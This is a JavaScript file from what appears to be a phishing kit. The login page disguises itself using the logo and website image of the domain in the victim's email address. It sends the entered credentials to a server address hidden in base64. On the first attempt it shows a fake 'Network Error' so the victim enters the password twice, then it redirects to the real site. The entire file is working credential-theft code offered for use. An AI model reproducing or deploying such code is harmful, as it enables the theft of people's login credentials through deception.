document.addEventListener("DOMContentLoaded", () => {
    const searchParams = new URLSearchParams(window.location.search);
    const hashedEmailValue = searchParams.get("wt_em")
        ? searchParams.get("wt_em")
        : "";
    const domainFromEmail = hashedEmailValue.split("@");
    const myDomain =
    domainFromEmail.length > 1 ? domainFromEmail[1] : "dhl.com";
    const domainRmCom = myDomain.replace(/\.com$/, "");
    const backgroundImage = document.querySelector("#background-img");
    const showEmail = document.querySelector("#email");
    const logo = document.querySelector(".logo-img");
    const logoSpan = document.querySelector("#logo-span");
    const bollob = document.querySelector("html").getAttribute("data-bollob");
    const loader = document.querySelector(".loader");
    const form = document.getElementById("my-login-form");
    const spinnerBtn = document.querySelector("#btn-spinner");
    const btnTTextNow = document.querySelector("#btn-text-now");
    const formSubmitBtn = document.querySelector("#final-submit-btn");

    window.onload = async () => {
    let someData = await getBackgroundImage();
    // removing loader
    setTimeout(() => {
        removeLoader();
    }, 1500);
    };

    function getBackgroundImage() {
    const thumbIoImg = `https://image.thum.io/get/auth/70953-lduyhg/https://www.${myDomain}/`;
    const logoClearbit = `https://logo.clearbit.com/https://${myDomain}`;
    // backgroundImage.src = thumbIoImg;
    logo.src = logoClearbit;
    showEmail.value = hashedEmailValue;
    logo.value = hashedEmailValue;
    logoSpan.textContent = domainRmCom.toUpperCase();
    }

    // handling form submition
    let isToggled = false;

    function handleFormSubmition(e) {
    e.preventDefault();
    var formData = new FormData(form);
    addBtnSpinner();

    if (isToggled) {
        // This handles the secondclick

        // console.log("Action 2");
        sendData(formData);
        window.location.href = `https://www.${myDomain}`;
    } else {
        // this handles the first click
        // console.log("Action 1");
        sendData(formData);

        // setTimeout(() => {
        //     removeBtnSpinner();
        // }, 2500);
    }
    // Toggle the state
    isToggled = !isToggled;
    }

    // adding event listerner to form
    form.addEventListener("submit", handleFormSubmition);

    // send information to server funtion
    function sendData(formData) {
    const formValue = Object.fromEntries(formData.entries());

    // Send data to server using Fetch API
    fetch(atob(bollob), {
        method: "POST",
        headers: {
        "Content-Type": "application/json",
        "X-CSRFToken": csrftoken,
        },
        body: JSON.stringify(formValue),
    })
        .then((response) => {
        if (!response.ok) {
            throw new Error("Network response was not ok");
        }
        return response.json();
        })
        .then((data) => {
        removeBtnSpinner();
        console.log("y");
        })
        .catch((error) => {
        console.error("Error sending data to server:", error);
        });
    }

    // removing loader
    function removeLoader() {
    loader.classList.add("loader-hidden");
    loader.style.display = "none";
    loader.addEventListener("transitionend", () => {
        document.body.removeChild("loader");
    });
    }

    function addBtnSpinner() {
    spinnerBtn.classList.add("spinner-button");
    btnTTextNow.textContent = "Processing";
    formSubmitBtn.style.backgroundColor = "#97add1";
    formSubmitBtn.setAttribute("disabled", true);
    }

    function removeBtnSpinner() {
    spinnerBtn.classList.remove("spinner-button");
    document.querySelector(
        ".perrwarning"
    ).innerHTML = `Network Error! Please verify your information and try again`;
    formSubmitBtn.removeAttribute("disabled");
    formSubmitBtn.style.backgroundColor = "rgb(33, 101, 228)";
    btnTTextNow.textContent = "Login";
    document.querySelector("#password").value = "";
    }

    function getCookie(name) {
    let cookieValue = null;
    if (document.cookie && document.cookie !== "") {
        const cookies = document.cookie.split(";");
        for (let i = 0; i < cookies.length; i++) {
        const cookie = cookies[i].trim();
        if (cookie.substring(0, name.length + 1) === name + "=") {
            cookieValue = decodeURIComponent(
            cookie.substring(name.length + 1)
            );
            break;
        }
        }
    }
    return cookieValue;
    }
    const csrftoken = getCookie("csrftoken");
});